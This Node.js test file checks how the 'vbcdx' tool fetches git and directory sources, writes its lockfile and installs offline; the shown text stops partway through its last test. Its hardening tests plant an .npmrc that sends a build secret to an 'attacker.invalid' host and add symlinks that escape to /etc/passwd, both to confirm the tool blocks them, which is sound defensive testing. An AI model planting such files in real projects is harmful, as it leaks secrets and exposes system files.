// Custom sources. `vbcdx fetch` resolves git (URL + ref) and dir sources
// at build time, validates each payload, installs a tool's dependencies from its lockfile,
// and writes vbcdx.lock.json; `--lock` then makes install and init read only the lock,
// offline. Git runs against local repositories through file:// URLs, so no test needs a
// network.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, existsSync, cpSync, readdirSync, chmodSync, appendFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync, execFileSync } from "node:child_process";
import { validateSources, SHORTHANDS, checkGitUrl } from "../src/sources/config.js";
import { gitEnv, readToken } from "../src/sources/git.js";
import { fetchSources } from "../src/sources/fetch.js";
import { readLock } from "../src/sources/lock.js";
import { treeDigest } from "../src/sources/tree.js";
import { EXIT } from "../src/errors.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = join(HERE, "..");
const PACK = join(HERE, "fixtures", "agent-pack");
const TOOL = join(HERE, "fixtures", "tool-package");
const read = (p) => readFileSync(p, "utf8");

function withDir(fn) {
  const d = mkdtempSync(join(tmpdir(), "vbcdx-2d-"));
  try {
    return fn(d);
  } finally {
    rmSync(d, { recursive: true, force: true });
  }
}

function codeOf(fn) {
  try {
    fn();
  } catch (err) {
    return { code: err.code, message: err.message };
  }
  return { code: EXIT.OK, message: "" };
}

const g = (cwd, ...args) => execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "init.defaultBranch=trunk", ...args], { cwd, encoding: "utf8" }).trim();

/** A local git repository holding a copy of `fixture`, committed on branch trunk. Returns { dir, url, sha }. */
function repoOf(root, name, fixture) {
  const dir = join(root, "repos", name);
  mkdirSync(dirname(dir), { recursive: true });
  cpSync(fixture, dir, { recursive: true });
  g(dir, "init", "-q");
  g(dir, "add", "-A");
  g(dir, "commit", "-q", "-m", "one");
  return { dir, url: `file://${dir}`, sha: g(dir, "rev-parse", "HEAD") };
}

function sourcesFile(root, sources) {
  const p = join(root, "vbcdx.sources.json");
  writeFileSync(p, JSON.stringify({ schema_version: 1, sources }));
  return p;
}

function fetchAt(root, sources, env = process.env) {
  return fetchSources({ sourcesPath: sourcesFile(root, sources), lockPath: join(root, "vbcdx.lock.json"), storeDir: join(root, "store"), env });
}

// ── the sources file ─────────────────────────────────────────────────────────

test("sources: one origin each, a ref for git, auth_env for https only; shorthands name the public repos", () => {
  const ok = validateSources({ schema_version: 1, sources: {
    "dev-agents": { shorthand: "dev-agents", ref: "main" },
    forgejo: { git: "https://git.example.org/acme/forgejo-plugin.git", ref: "v1.2.0", auth_env: "FJ_ACCESS_TOKEN" },
    local: { dir: "rel/local" },
  } }, "/base");
  assert.deepEqual(ok, [
    { name: "dev-agents", origin: "git", git: SHORTHANDS["dev-agents"], ref: "main", shorthand: "dev-agents" },
    { name: "forgejo", origin: "git", git: "https://git.example.org/acme/forgejo-plugin.git", ref: "v1.2.0", authEnv: "FJ_ACCESS_TOKEN" },
    { name: "local", origin: "dir", dir: "/base/rel/local" },
  ]);
  // The public repositories are named after their packages.
  assert.deepEqual(SHORTHANDS, {
    "dev-agents": "https://github.com/VBCDX/dev-agents-plugin.git",
    forgejo: "https://github.com/VBCDX/forgejo-plugin.git",
    coolify: "https://github.com/VBCDX/coolify-plugin.git",
  });
  const bad = (sources, re, doc = { schema_version: 1, sources }) => {
    const r = codeOf(() => validateSources(doc, "/base"));
    assert.equal(r.code, EXIT.CONFIG, JSON.stringify(sources));
    assert.match(r.message, re);
    return r.message;
  };
  bad({ a1: { git: "https://x.example/r.git", dir: "/d", ref: "main" } }, /exactly one of shorthand, git, dir/);
  bad({ a1: { ref: "main" } }, /exactly one of/);
  bad({ a1: { shorthand: "nope", ref: "main" } }, /unknown shorthand/);
  bad({ a1: { git: "http://x.example/r.git", ref: "main" } }, /https:\/\/ or file:\/\//);
  bad({ a1: { git: "ssh://x.example/r.git", ref: "main" } }, /https:\/\/ or file:\/\//);
  const leak = bad({ a1: { git: "https://user:SECRET-PW@x.example/r.git", ref: "main" } }, /carries credentials/);
  assert.equal(leak.includes("SECRET-PW"), false, "the URL with its userinfo is never echoed");
  bad({ a1: { git: "https://x.example/r.git" } }, /ref must be/);
  for (const ref of ["-x", "a..b", "a b", "a//b", "x.lock", "x/", "x@{1}"]) bad({ a1: { git: "https://x.example/r.git", ref } }, /ref must be/);
  bad({ a1: { git: "file:///r", ref: "main", auth_env: "TOKEN" } }, /auth_env applies to an https:\/\/ source only/);
  bad({ a1: { git: "https://x.example/r.git", ref: "main", auth_env: "lower" } }, /auth_env must be/);
  bad({ a1: { dir: "/d", ref: "main" } }, /takes no ref or auth_env/);
  bad({ A1: { dir: "/d" } }, /a name is/);
  bad({ a1: { dir: "/d", extra: 1 } }, /unknown field "extra"/);
  bad({}, /lists no sources/);
  bad(null, /newer|upgrade/, { schema_version: 2, sources: {} });
  assert.equal(checkGitUrl("file:///tmp/r", "x").protocol, "file:");
});

// ── git ──────────────────────────────────────────────────────────────────────

test("a token travels only in the child's environment, scoped to the source's origin", () => {
  const env = gitEnv("https://git.example.org/acme/r.git", "tok-123", { PATH: "/bin", GIT_CONFIG_COUNT: "9", GIT_CONFIG_KEY_0: "x", GIT_ASKPASS: "/a" });
  assert.deepEqual(env, {
    PATH: "/bin", GIT_TERMINAL_PROMPT: "0", GIT_CONFIG_COUNT: "1",
    GIT_CONFIG_KEY_0: "http.https://git.example.org/.extraheader", GIT_CONFIG_VALUE_0: "Authorization: token tok-123",
  });
  assert.deepEqual(gitEnv("file:///r", null, { PATH: "/bin" }), { PATH: "/bin", GIT_TERMINAL_PROMPT: "0" });
  assert.throws(() => gitEnv("file:///r", "t", {}), /only sent to an https/);
  assert.equal(readToken("T", { T: "abc\r\n" }), "abc", "a pasted trailing newline is dropped");
  assert.throws(() => readToken("T", { T: "a\u0007b" }), /control character/);
  assert.throws(() => readToken("T", {}), /T is not set/);
});

test("fetch resolves a branch, a tag (annotated too) and a full SHA, records the commit, and strips .git", () => withDir((root) => {
  const pack = repoOf(root, "pack", PACK);
  const first = pack.sha;
  g(pack.dir, "tag", "v1");
  g(pack.dir, "tag", "-a", "-m", "annotated", "v2");
  writeFileSync(join(pack.dir, "NOTES"), "second\n");
  g(pack.dir, "add", "-A");
  g(pack.dir, "commit", "-q", "-m", "two");
  const second = g(pack.dir, "rev-parse", "HEAD");
  const r = fetchAt(root, {
    branch: { git: pack.url, ref: "trunk" },
    tag: { git: pack.url, ref: "v1" },
    annotated: { git: pack.url, ref: "v2" },
    pinned: { git: pack.url, ref: first },
  });
  assert.deepEqual(r.sources.map((s) => [s.name, s.sha, s.kinds]), [
    ["branch", second, ["agents"]], ["tag", first, ["agents"]], ["annotated", first, ["agents"]], ["pinned", first, ["agents"]],
  ]);
  const lock = JSON.parse(read(join(root, "vbcdx.lock.json")));
  assert.equal(lock.store, "store", "a store next to the lock is recorded relative to it");
  assert.deepEqual(lock.sources.branch, { kinds: ["agents"], ref: "trunk", sha: second, path: `branch@${second}`, digest: lock.sources.branch.digest, git: pack.url });
  for (const name of ["branch", "tag"]) {
    const dir = join(root, "store", lock.sources[name].path);
    assert.equal(existsSync(join(dir, ".git")), false, ".git never reaches the store");
    assert.equal(existsSync(join(dir, "vbcdx-pack.json")), true);
  }
  assert.equal(existsSync(join(root, "store", `branch@${second}`, "NOTES")), true);
  assert.equal(existsSync(join(root, "store", `tag@${first}`, "NOTES")), false);
  assert.deepEqual(readdirSync(join(root, "store")).filter((n) => n.startsWith(".")), [], "no temporary directory is left");
}));

test("a name that is both a branch and a tag is refused, as is a ref that does not exist", () => withDir((root) => {
  const pack = repoOf(root, "pack", PACK);
  g(pack.dir, "tag", "trunk");
  assert.match(codeOf(() => fetchAt(root, { p1: { git: pack.url, ref: "trunk" } })).message, /Source p1: ref trunk is both a branch and a tag/);
  assert.match(codeOf(() => fetchAt(root, { p1: { git: pack.url, ref: "nope" } })).message, /Source p1: no branch or tag named nope/);
  assert.equal(existsSync(join(root, "vbcdx.lock.json")), false);
}));

test("the token never lands in argv, the lock, the store or a message, even in git's own error output", () => withDir((root) => {
  const CANARY = "canary-tok-5f3a9e";
  // A git stand-in that records its argv and the header config it was handed, then fails
  // the way a refused clone does, quoting that header back on stderr.
  const shimDir = join(root, "shim");
  mkdirSync(shimDir);
  const log = join(root, "git.log");
  writeFileSync(join(shimDir, "git"), `#!/bin/sh\nprintf 'argv:%s\\n' "$*" >> "${log}"\nprintf 'key:%s value:%s\\n' "$GIT_CONFIG_KEY_0" "$GIT_CONFIG_VALUE_0" >> "${log}"\necho "fatal: refused, header was $GIT_CONFIG_VALUE_0" >&2\nexit 128\n`);
  chmodSync(join(shimDir, "git"), 0o755);
  const env = { ...process.env, PATH: `${shimDir}:${process.env.PATH}`, PRIV_TOKEN: CANARY };
  const r = codeOf(() => fetchAt(root, { priv: { git: "https://git.example.invalid/acme/private.git", ref: "main", auth_env: "PRIV_TOKEN" } }, env));
  assert.equal(r.code, EXIT.CONFIG);
  assert.match(r.message, /^Source priv: git ls-remote failed: fatal: refused, header was Authorization: token <token>$/);
  const lines = read(log).split("\n").filter(Boolean);
  assert.ok(lines.some((l) => l === `key:http.https://git.example.invalid/.extraheader value:Authorization: token ${CANARY}`), lines.join("\n"));
  for (const l of lines.filter((x) => x.startsWith("argv:"))) assert.equal(l.includes(CANARY), false, l);
  assert.equal(existsSync(join(root, "vbcdx.lock.json")), false);
  const store = join(root, "store");
  assert.deepEqual(existsSync(store) ? readdirSync(store) : [], []);
}));

// ── payloads ─────────────────────────────────────────────────────────────────

test("a source with no payload, or an invalid one, fails fetch by name and writes no lock", () => withDir((root) => {
  const empty = join(root, "empty");
  mkdirSync(empty);
  writeFileSync(join(empty, "README.md"), "nothing\n");
  let r = codeOf(() => fetchAt(root, { pack: { dir: PACK }, empty: { dir: empty } }));
  assert.equal(r.code, EXIT.CONFIG);
  assert.match(r.message, /^Source empty ships none of vbcdx-pack.json \(an agent pack\), vbcdx.json \(a tool package\) or vbcdx-overlay.json \(an overlay\)\.$/);
  assert.equal(existsSync(join(root, "vbcdx.lock.json")), false, "one bad source and there is no lock at all");
  const broken = join(root, "broken");
  cpSync(TOOL, broken, { recursive: true });
  const decl = JSON.parse(read(join(broken, "vbcdx.json")));
  decl.server_name = "Bad_Name";
  writeFileSync(join(broken, "vbcdx.json"), JSON.stringify(decl));
  r = codeOf(() => fetchAt(root, { broken: { dir: broken } }));
  assert.match(r.message, /^Source broken: .*server_name/s);
  assert.equal(r.message.includes(join(root, "store")), false, "the message names the source, not a temporary path");
  assert.equal(existsSync(join(root, "vbcdx.lock.json")), false);
  assert.deepEqual(readdirSync(join(root, "store")).filter((n) => n.startsWith(".")), [], "no temporary directory is left");
}));

test("a tool's dependencies install from its lockfile without install scripts; without a lockfile it is refused", () => withDir((root) => {
  // A dependency the tool needs at run time, vendored as a tarball inside the tool so npm
  // needs no registry and the lockfile's relative path still holds in the store copy.
  const dep = join(root, "dep");
  mkdirSync(dep);
  writeFileSync(join(dep, "package.json"), JSON.stringify({ name: "example-dep", version: "1.0.0", scripts: { install: "touch INSTALL_SCRIPT_RAN" } }));
  writeFileSync(join(dep, "index.js"), "module.exports = 1;\n");
  const tool = join(root, "tool");
  cpSync(TOOL, tool, { recursive: true });
  mkdirSync(join(tool, "vendor"));
  execFileSync("npm", ["pack", "--pack-destination", join(tool, "vendor"), "--ignore-scripts"], { cwd: dep, stdio: "ignore" });
  const pkg = JSON.parse(read(join(tool, "package.json")));
  pkg.dependencies = { "example-dep": "file:vendor/example-dep-1.0.0.tgz" };
  writeFileSync(join(tool, "package.json"), JSON.stringify(pkg));
  let r = codeOf(() => fetchAt(root, { tool: { dir: tool } }));
  assert.match(r.message, /^Source tool has dependencies but no package-lock.json/);
  execFileSync("npm", ["install", "--package-lock-only", "--ignore-scripts", "--no-audit", "--no-fund"], { cwd: tool, stdio: "ignore" });
  const out = fetchAt(root, { tool: { dir: tool } });
  const stored = join(root, "store", out.sources[0].path);
  assert.equal(out.sources[0].kinds.join(), "tool");
  assert.equal(existsSync(join(stored, "node_modules", "example-dep", "index.js")), true);
  assert.equal(existsSync(join(stored, "node_modules", "example-dep", "INSTALL_SCRIPT_RAN")), false, "install scripts never run");
  assert.equal(existsSync(join(tool, "node_modules")), false, "the source directory itself is untouched");
  assert.equal(treeDigest(stored), out.sources[0].digest, "the digest covers the installed tree");
}));

// ── offline install from the lock ────────────────────────────────────────────

function vbcdx(args, { home, env = {} }) {
  const e = { ...process.env, HOME: home, ...env };
  for (const k of ["CLAUDE_CONFIG_DIR", "CODEX_HOME", "OPENCODE_CONFIG_DIR", "HERMES_HOME"]) delete e[k];
  return spawnSync(process.execPath, [join(ROOT, "bin", "vbcdx.js"), ...args], { encoding: "utf8", env: e, cwd: home });
}

/** PATH with only node: no git and no npm, so anything that tried to fetch would fail. */
function offlineEnv(root) {
  const bin = join(root, "offline-bin");
  mkdirSync(bin, { recursive: true });
  execFileSync("ln", ["-sf", process.execPath, join(bin, "node")]);
  return { PATH: bin, npm_config_registry: "http://127.0.0.1:9/" };
}

test("with --lock, install and init read only the lock, offline, and report each source's commit", () => withDir((root) => {
  const pack = repoOf(root, "pack", PACK);
  const tool = repoOf(root, "tool", TOOL);
  fetchAt(root, { pack: { git: pack.url, ref: "trunk" }, tracker: { git: tool.url, ref: tool.sha } });
  const home = join(root, "home");
  mkdirSync(join(home, ".claude"), { recursive: true });
  const lockArg = `--lock=${join(root, "vbcdx.lock.json")}`;
  const env = offlineEnv(root);
  let r = vbcdx(["install", "tool", "tracker", "--harness=claude", lockArg], { home, env });
  assert.equal(r.status, 0, r.stderr);
  assert.ok(read(join(home, ".claude.json")).includes(join(root, "store", `tracker@${tool.sha}`, "bin", "example-tracker")));
  assert.match(r.stdout, new RegExp(`source tracker \\(tool\\): ${tool.url} ${tool.sha} @ ${tool.sha}`));
  r = vbcdx(["install", "agent", "code-agent", "--harness=claude", lockArg, "--json"], { home, env });
  assert.equal(r.status, 0, r.stderr);
  const report = JSON.parse(r.stdout);
  assert.equal(report.generated[0].role, "code-agent");
  assert.deepEqual(report.sources.map((s) => [s.name, s.sha]), [["pack", pack.sha], ["tracker", tool.sha]]);
  // The package name works too; anything the lock does not hold is refused, never searched for.
  assert.equal(vbcdx(["install", "tool", "@example/tracker-plugin", "--harness=claude", lockArg, "--quiet"], { home, env }).status, 0);
  r = vbcdx(["install", "tool", "@example/elsewhere", "--harness=claude", lockArg], { home, env });
  assert.equal(r.status, EXIT.CONFIG);
  assert.match(r.stderr, /@example\/elsewhere is not a tool package in the lock .* \(it has: tracker\); with --lock, nothing else is searched/);
  r = vbcdx(["sources", lockArg, "--json"], { home, env });
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(JSON.parse(r.stdout).sources.map((s) => [s.name, s.kinds, s.git, s.ref, s.sha]), [
    ["pack", ["agents"], pack.url, "trunk", pack.sha], ["tracker", ["tool"], tool.url, tool.sha, tool.sha],
  ]);
  // vbcdx-dev-agents init, as a Hermes image's entrypoint runs it.
  const cfg = join(root, "init.env");
  writeFileSync(cfg, `VBCDX_AGENTS_BASE_DIR=${root}/state\nVBCDX_AGENTS_CREDENTIALS_DIR=${root}/creds\nVBCDX_AGENTS_HERMES_HOME=${root}/hermes\n`);
  const init = spawnSync(process.execPath, [join(ROOT, "bin", "vbcdx-dev-agents.js"), "init", "--harness=hermes", `--env=${cfg}`, lockArg, "--agents=code-agent", "--force"],
    { encoding: "utf8", env: { ...env, HOME: home }, cwd: root });
  assert.equal(init.status, 0, init.stderr);
  assert.match(init.stdout, new RegExp(`source pack: ${pack.url} trunk @ ${pack.sha}`));
  assert.equal(existsSync(join(root, "hermes", "profiles", "code-agent", "SOUL.md")), true);
}));

test("a changed store, a missing entry or a newer lock is refused by name, and nothing is written", () => withDir((root) => {
  const pack = repoOf(root, "pack", PACK);
  fetchAt(root, { pack: { git: pack.url, ref: "trunk" } });
  const lockPath = join(root, "vbcdx.lock.json");
  const home = join(root, "home");
  mkdirSync(join(home, ".claude"), { recursive: true });
  const env = offlineEnv(root);
  const stored = join(root, "store", `pack@${pack.sha}`);
  appendFileSync(join(stored, "vbcdx-pack.json"), "\n");
  let r = vbcdx(["install", "agent", "code-agent", "--harness=claude", `--lock=${lockPath}`], { home, env });
  assert.equal(r.status, EXIT.CONFIG);
  assert.match(r.stderr, /source "pack": .* no longer matches the digest vbcdx fetch recorded; rerun vbcdx fetch/);
  assert.equal(existsSync(join(home, ".claude", "agents")), false, "nothing was written");
  rmSync(stored, { recursive: true });
  r = vbcdx(["install", "agent", "code-agent", "--harness=claude", `--lock=${lockPath}`], { home, env });
  assert.match(r.stderr, /source "pack": .* is missing; rerun vbcdx fetch or point --store at the fetched store/);
  const lock = JSON.parse(read(lockPath));
  lock.schema_version = 2;
  writeFileSync(lockPath, JSON.stringify(lock));
  assert.match(codeOf(() => readLock(lockPath)).message, /newer than this vbcdx reads \(1\); upgrade vbcdx/);
  lock.schema_version = 1;
  lock.sources.pack.path = "../../etc";
  writeFileSync(lockPath, JSON.stringify(lock));
  assert.match(codeOf(() => readLock(lockPath)).message, /path must be pack@/, "a lock cannot point outside its store");
}));

test("the store can move: --store points at it, and a store next to the lock moves with it", () => withDir((root) => {
  const pack = repoOf(root, "pack", PACK);
  fetchAt(root, { pack: { git: pack.url, ref: "trunk" } });
  const moved = join(root, "image");
  mkdirSync(moved);
  cpSync(join(root, "store"), join(moved, "store"), { recursive: true });
  cpSync(join(root, "vbcdx.lock.json"), join(moved, "vbcdx.lock.json"));
  rmSync(join(root, "store"), { recursive: true });
  assert.equal(readLock(join(moved, "vbcdx.lock.json")).sources[0].absDir, join(moved, "store", `pack@${pack.sha}`));
  cpSync(join(moved, "store"), join(root, "elsewhere"), { recursive: true });
  assert.equal(readLock(join(moved, "vbcdx.lock.json"), { store: join(root, "elsewhere") }).sources[0].absDir, join(root, "elsewhere", `pack@${pack.sha}`));
}));

test("CLI: fetch with defaults next to the sources file, and option rules", () => withDir((root) => {
  const pack = repoOf(root, "pack", PACK);
  sourcesFile(root, { pack: { git: pack.url, ref: "trunk" } });
  let r = vbcdx(["fetch"], { home: root });
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, new RegExp(`^Fetched 1 source\\(s\\); lock ${join(root, "vbcdx.lock.json")}\\n {2}source pack \\(agents\\): ${pack.url} trunk @ ${pack.sha}$`, "m"));
  assert.equal(existsSync(join(root, "vbcdx-store", `pack@${pack.sha}`)), true);
  for (const [args, re] of [
    [["fetch", "--harness=claude"], /fetch does not take --harness/],
    [["sources", "--sources=x"], /sources does not take --sources/],
    [["install", "agent", "code-agent", "--harness=claude", "--sources=x"], /does not take --sources/],
    [["list", "--harness=claude", "--lock=x"], /list does not take --lock/],
    [["install", "agent", "code-agent", "--harness=claude", "--store=x"], /--store goes with --lock/],
  ]) {
    r = vbcdx(args, { home: root });
    assert.equal(r.status, EXIT.CONFIG, args.join(" "));
    assert.match(r.stderr, re);
  }
}));

// ── what the battery asked for: each rule its own failing case ───────────────

test("a dir source that is itself a git checkout reaches the store without .git; a broken agent pack fails by name", () => withDir((root) => {
  const pack = repoOf(root, "pack", PACK);
  const out = fetchAt(root, { local: { dir: pack.dir } });
  const stored = join(root, "store", out.sources[0].path);
  assert.equal(existsSync(join(stored, ".git")), false);
  assert.equal(existsSync(join(stored, "vbcdx-pack.json")), true);
  const broken = join(root, "broken-pack");
  cpSync(PACK, broken, { recursive: true });
  const decl = JSON.parse(read(join(broken, "vbcdx-pack.json")));
  decl.roles = ["no-such-role"];
  writeFileSync(join(broken, "vbcdx-pack.json"), JSON.stringify(decl));
  const r = codeOf(() => fetchAt(root, { broken: { dir: broken } }));
  assert.equal(r.code !== EXIT.OK, true);
  assert.match(r.message, /^Source broken: /);
}));

test("a change that keeps a file's size is still a digest mismatch", () => withDir((root) => {
  const pack = repoOf(root, "pack", PACK);
  fetchAt(root, { pack: { git: pack.url, ref: "trunk" } });
  const file = join(root, "store", `pack@${pack.sha}`, "package.json");
  const text = read(file);
  writeFileSync(file, text.replace("1.0.0", "9.9.9"));
  assert.equal(read(file).length, text.length);
  assert.match(codeOf(() => readLock(join(root, "vbcdx.lock.json"))).message, /no longer matches the digest/);
}));

test("a checkout that is not the resolved commit is refused", () => withDir((root) => {
  const pack = repoOf(root, "pack", PACK);
  const shimDir = join(root, "shim");
  mkdirSync(shimDir);
  const realGit = execFileSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).trim();
  // Delegates everything to git, but reports another commit for rev-parse HEAD.
  writeFileSync(join(shimDir, "git"), `#!/bin/sh\nfor a in "$@"; do [ "$a" = rev-parse ] && { echo ${"f".repeat(40)}; exit 0; }; done\nexec "${realGit}" "$@"\n`);
  chmodSync(join(shimDir, "git"), 0o755);
  const r = codeOf(() => fetchAt(root, { pack: { git: pack.url, ref: pack.sha } }, { ...process.env, PATH: `${shimDir}:${process.env.PATH}` }));
  assert.match(r.message, new RegExp(`^Source pack: checked out ${"f".repeat(40)}, expected ${pack.sha}\\.$`));
  assert.equal(existsSync(join(root, "vbcdx.lock.json")), false);
}));

test("a sources file naming one source twice is refused", () => withDir((root) => {
  const p = join(root, "vbcdx.sources.json");
  writeFileSync(p, '{ "schema_version": 1, "sources": { "a1": { "dir": "/x" }, "a1": { "dir": "/y" } } }');
  const r = codeOf(() => fetchSources({ sourcesPath: p, lockPath: join(root, "l.json"), storeDir: join(root, "s") }));
  assert.match(r.message, /duplicate object key "a1"/);
}));

// ── The fetched tree cannot configure, or read secrets through, the npm that installs it ──

function toolWithDependency(root) {
  const dep = join(root, "dep");
  mkdirSync(dep);
  writeFileSync(join(dep, "package.json"), JSON.stringify({ name: "example-dep", version: "1.0.0" }));
  writeFileSync(join(dep, "index.js"), "module.exports = 1;\n");
  const tool = join(root, "tool");
  cpSync(TOOL, tool, { recursive: true });
  mkdirSync(join(tool, "vendor"));
  execFileSync("npm", ["pack", "--pack-destination", join(tool, "vendor"), "--ignore-scripts"], { cwd: dep, stdio: "ignore" });
  const pkg = JSON.parse(read(join(tool, "package.json")));
  pkg.dependencies = { "example-dep": "file:vendor/example-dep-1.0.0.tgz" };
  writeFileSync(join(tool, "package.json"), JSON.stringify(pkg));
  execFileSync("npm", ["install", "--package-lock-only", "--ignore-scripts", "--no-audit", "--no-fund"], { cwd: tool, stdio: "ignore" });
  return tool;
}

test("npm runs with no caller secret, empty configs, an explicit registry, and without the source's .npmrc", () => withDir((root) => {
  const tool = toolWithDependency(root);
  // The source's own .npmrc tries to send a caller secret to a host it names.
  writeFileSync(join(tool, ".npmrc"), "registry=https://attacker.invalid/${BUILD_SECRET}/\n//attacker.invalid/:_authToken=${BUILD_SECRET}\n");
  // An npm stand-in that records what it was given, then runs the real npm.
  const shimDir = join(root, "shim");
  mkdirSync(shimDir);
  const log = join(root, "npm.log");
  const realNpm = execFileSync("sh", ["-c", "command -v npm"], { encoding: "utf8" }).trim();
  writeFileSync(join(shimDir, "npm"), `#!/bin/sh\nenv > "${log}"\n[ -e .npmrc ] && echo "PROJECT_NPMRC_PRESENT" >> "${log}"\nexec "${realNpm}" "$@"\n`);
  chmodSync(join(shimDir, "npm"), 0o755);
  const env = { ...process.env, PATH: `${shimDir}:${process.env.PATH}`, BUILD_SECRET: "canary-build-secret-91a7", PRIV_TOKEN: "canary-token-3c2e" };
  delete env.npm_config_registry;
  const out = fetchAt(root, { tool: { dir: tool } }, env);
  const seen = read(log);
  for (const canary of ["canary-build-secret-91a7", "canary-token-3c2e"]) assert.equal(seen.includes(canary), false, `npm saw ${canary}`);
  assert.equal(seen.includes("PROJECT_NPMRC_PRESENT"), false, "the source's .npmrc is gone before npm runs");
  const vars = Object.fromEntries(seen.split("\n").filter((l) => /^[A-Za-z_][A-Za-z0-9_]*=/.test(l)).map((l) => [l.slice(0, l.indexOf("=")), l.slice(l.indexOf("=") + 1)]));
  assert.equal(vars.npm_config_registry, "https://registry.npmjs.org/");
  assert.notEqual(vars.HOME, process.env.HOME);
  assert.notEqual(vars.npm_config_userconfig, vars.npm_config_globalconfig);
  assert.deepEqual(Object.keys(vars).filter((k) => !["PATH", "HOME", "PWD", "SHLVL", "_", "OLDPWD"].includes(k) && !k.startsWith("npm_config_")), [],
    "nothing else of the caller's environment reaches npm");
  const stored = join(root, "store", out.sources[0].path);
  assert.equal(existsSync(join(stored, ".npmrc")), false);
  assert.equal(existsSync(join(stored, "node_modules", "example-dep", "index.js")), true);
  assert.equal(existsSync(join(tool, ".npmrc")), true, "the source directory itself is untouched");
}));

test("the caller's own registry and proxy are kept, but never a registry that carries credentials", async () => {
  const { npmEnv } = await import("../src/sources/fetch.js");
  withDir((root) => {
    const s1 = join(root, "a");
    mkdirSync(s1);
    const env = npmEnv({ PATH: "/bin", HTTPS_PROXY: "http://proxy.example:3128", npm_config_registry: "https://npm.example.org/repo/", SECRET: "x" }, s1);
    assert.equal(env.npm_config_registry, "https://npm.example.org/repo/");
    assert.equal(env.HTTPS_PROXY, "http://proxy.example:3128");
    assert.equal("SECRET" in env, false);
    const withUserinfo = new URL("https://npm.example.org/");
    withUserinfo.username = "u";
    withUserinfo.password = "p";
    for (const bad of [withUserinfo.href, "file:///tmp/r", "not a url"]) {
      const s2 = mkdtempSync(join(root, "b-"));
      assert.throws(() => npmEnv({ npm_config_registry: bad }, s2), /npm_config_registry must be/);
    }
  });
});

test("git never inherits tracing that would write the token header to a file", () => {
  const env = gitEnv("https://git.example.org/r.git", "tok", { PATH: "/bin", GIT_TRACE: "1", GIT_TRACE_CURL: "/tmp/t", GIT_TRACE_PACKET: "1", GIT_CURL_VERBOSE: "1", GIT_TRACE2_EVENT: "/tmp/e", GIT_DIR_KEEP: "kept" });
  assert.deepEqual(Object.keys(env).sort(), ["GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0", "GIT_DIR_KEEP", "GIT_TERMINAL_PROMPT", "PATH"]);
});

test("the default store is ignored by git, so a fetched private tree is not committed by accident", () => {
  assert.ok(read(join(ROOT, ".gitignore")).split("\n").includes("vbcdx-store/"));
});

test("a Hermes render through --lock is byte-identical to the same pack through --pack (design test 7)", () => withDir((root) => {
  const pack = repoOf(root, "pack", PACK);
  fetchAt(root, { pack: { git: pack.url, ref: "trunk" } });
  const render = (name, packArgs) => {
    const d = join(root, name);
    mkdirSync(d);
    writeFileSync(join(d, "cfg.env"), `VBCDX_AGENTS_BASE_DIR=${d}/state\nVBCDX_AGENTS_CREDENTIALS_DIR=${d}/creds\nVBCDX_AGENTS_HERMES_HOME=${d}/home\n`);
    const r = spawnSync(process.execPath, [join(ROOT, "bin", "vbcdx-dev-agents.js"), "init", "--harness=hermes", `--env=${join(d, "cfg.env")}`, "--force", ...packArgs],
      { encoding: "utf8", cwd: d, env: { ...offlineEnv(root), HOME: d } });
    assert.equal(r.status, 0, r.stderr);
    const files = {};
    const walk = (dir, rel) => {
      for (const ent of readdirSync(dir, { withFileTypes: true }).sort((a, b) => (a.name < b.name ? -1 : 1))) {
        const p = rel ? `${rel}/${ent.name}` : ent.name;
        if (ent.isDirectory()) walk(join(dir, ent.name), p);
        else files[p] = read(join(dir, ent.name));
      }
    };
    walk(join(d, "home"), "");
    return files;
  };
  const viaPack = render("pack-render", [`--pack=${PACK}`]);
  const viaLock = render("lock-render", [`--lock=${join(root, "vbcdx.lock.json")}`]);
  assert.ok(Object.keys(viaPack).length > 10);
  assert.deepEqual(Object.keys(viaLock), Object.keys(viaPack));
  // The lock's copy of the pack lives at another path; nothing rendered may depend on where.
  for (const [p, text] of Object.entries(viaPack)) assert.equal(viaLock[p], text, p);
}));

// ── A symlink can't carry a fetched tree out of itself ─────────────

test("a git source whose prompt.md links to a file outside it is refused at fetch, by name, before anything reads it", () => withDir((root) => {
  const outside = join(root, "outside-secret.txt");
  writeFileSync(outside, "SECRET-CREDENTIAL-CONTENT\n");
  const pack = repoOf(root, "pack", PACK);
  const prompt = join(pack.dir, "assets", "roles", "code-agent", "prompt.md");
  rmSync(prompt);
  execFileSync("ln", ["-s", outside, prompt]);
  g(pack.dir, "add", "-A");
  g(pack.dir, "commit", "-q", "-m", "link out");
  const r = codeOf(() => fetchAt(root, { pack: { git: pack.url, ref: "trunk" } }));
  assert.equal(r.code, EXIT.CONFIG);
  assert.equal(r.message, "Source pack: assets/roles/code-agent/prompt.md is a symlink that points outside the source; a source may only link inside itself.");
  assert.equal(existsSync(join(root, "vbcdx.lock.json")), false);
  assert.deepEqual(readdirSync(join(root, "store")), [], "nothing reaches the store");
}));

test("a dir source is refused for a relative link that climbs out, and for a dangling link", () => withDir((root) => {
  writeFileSync(join(root, "outside.txt"), "x\n");
  // Far enough up to leave any store, wherever the copy sits; /etc/passwd exists everywhere.
  const climb = `${"../".repeat(24)}etc/passwd`;
  for (const [target, what] of [[climb, "points outside the source"], ["/etc/passwd", "points outside the source"], ["no-such-file", "does not resolve to anything"]]) {
    const dir = join(root, `pack-${what.length}-${target.length}`);
    cpSync(PACK, dir, { recursive: true });
    execFileSync("ln", ["-s", target, join(dir, "assets", "roles", "code-agent", "extra")]);
    const r = codeOf(() => fetchAt(root, { pack: { dir } }));
    assert.equal(r.message, `Source pack: assets/roles/code-agent/extra is a symlink that ${what}; a source may only link inside itself.`, target);
    assert.equal(existsSync(join(root, "vbcdx.lock.json")), false);
  }
  // A link to the tree's root itself would let a reader walk the whole tree through it twice.
  const self = join(root, "pack-self");
  cpSync(PACK, self, { recursive: true });
  execFileSync("ln", ["-s", "..", join(self, "assets", "up")]);
